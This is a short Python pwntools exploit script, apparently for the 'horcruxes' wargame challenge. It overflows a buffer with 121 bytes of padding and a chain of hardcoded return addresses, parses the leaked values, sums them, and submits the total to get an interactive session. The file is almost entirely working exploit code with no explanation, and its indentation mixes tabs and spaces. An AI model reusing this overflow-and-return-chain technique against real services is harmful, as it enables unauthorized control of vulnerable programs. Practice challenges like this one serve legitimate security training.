# By far the worst exploit i have ever written!
# credits to me ( @proud_skid )

from pwn import *

def pwn():
	#r = process('/home/horcruxes/horcruxes')
	r = remote('0', 9032)
	payload =  ''

	payload += 'A'*121
	payload += p32(0x809fe4b)
	
	payload += p32(0x809fe6a)
	payload += p32(0x809fe89)
	payload += p32(0x809fea8)
	payload += p32(0x809fec7)
	payload += p32(0x809fee6)
	payload += p32(0x809ff05)
	payload += p32(0x0809fffc)
	r.sendline(payload)
	r.recvline()
	r.recvline()
	r.recvline()
	r.recvline()
	a = r.recvline()
        b = r.recvline()
        c = r.recvline()
        d = r.recvline()
	e = r.recvline()
	f = r.recvline()
	g = r.recvline()
        a = a[36:len(a)-2]
	b = b[38:len(b)-2]
	c = c[40:len(c)-2]
	d = d[44:len(d)-2]
	e = e[43:len(e)-2]
	f = f[34:len(f)-2]
	g = g[30:len(g)-2]
	print 'A: '+a
        print 'B: '+b
        print 'C: '+c
        print 'D: '+d
	print 'E: '+e
	print 'F: '+f
	print 'G: '+g
	exp = 0
	if '-' in a:
		exp -= int(a[2:])
	else:
		exp += int(a[1:])
	if '-' in b:
                exp -= int(b[2:])
        else:
                exp += int(b[1:])
	if '-' in c:
                exp -= int(c[2:])
        else:
                exp += int(c[1:])
	if '-' in d:
                exp -= int(d[2:])
        else:
                exp += int(d[1:])
	if '-' in e:
                exp -= int(e[2:])
        else:
                exp += int(e[1:])
	if '-' in f:
                exp -= int(f[2:])
        else:
                exp += int(f[1:])
	if '-' in g:
                exp -= int(g[2:])
        else:
                exp += int(g[1:])


	if exp < 0:
		print 'Too little XP, poor mike...'
		exit()
	else:
		print str(exp)

	r.sendline('1')
	print r.recvuntil('How many EXP did you earned? :')
	r.sendline(str(exp))
	
	r.interactive()
	
pwn()
